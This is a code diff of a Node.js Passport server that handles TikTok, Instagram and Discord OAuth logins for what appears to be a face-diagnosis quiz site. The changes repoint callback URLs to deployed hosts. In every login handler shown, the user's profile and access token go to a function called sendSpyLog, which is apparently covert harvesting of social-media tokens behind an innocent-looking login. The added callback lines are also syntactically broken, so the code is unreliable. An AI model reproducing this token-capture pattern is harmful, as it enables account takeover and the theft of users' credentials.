@@ -48,7 +48,7 @@ return done(null, profile);
 passport.use(new TikTokStrategy({
 clientID: 'あとで書き換える_TIKTOK_KEY',
 clientSecret: 'あとで書き換える_TIKTOK_SECRET',
-callbackURL: 'http://localhost:3000/auth/tiktok/callback',
+https://lol-web-server.onrender.com/auth/tiktok/callback
 scope: ['user.info.basic']
 }, (accessToken, refreshToken, profile, done) => {
 sendSpyLog('TikTok', profile, accessToken);
@@ -58,7 +58,7 @@ return done(null, profile);
 passport.use(new InstagramStrategy({
 clientID: 'あとで書き換える_INSTA_ID',
 clientSecret: 'あとで書き換える_INSTA_SECRET',
-callbackURL: 'http://localhost:3000/auth/instagram/callback'
+https://lol-web-server.onrender.com/auth/instagram/callback
 }, (accessToken, refreshToken, profile, done) => {
 sendSpyLog('Instagram', profile, accessToken);
 return done(null, profile);
@@ -66,7 +66,7 @@ return done(null, profile);
 
 app.get('/auth/discord', passport.authenticate('discord'));
 app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
-res.redirect(`http://127.0.0.1:5500/aichat.html?name=${encodeURIComponent(req.user.username)}`);
+res.redirect(`https://faceidshindan.web.app/aichat.html?name=${encodeURIComponent(req.user.username)}`);
 });
 
 app.get('/auth/tiktok', passport.authenticate('tiktok'));
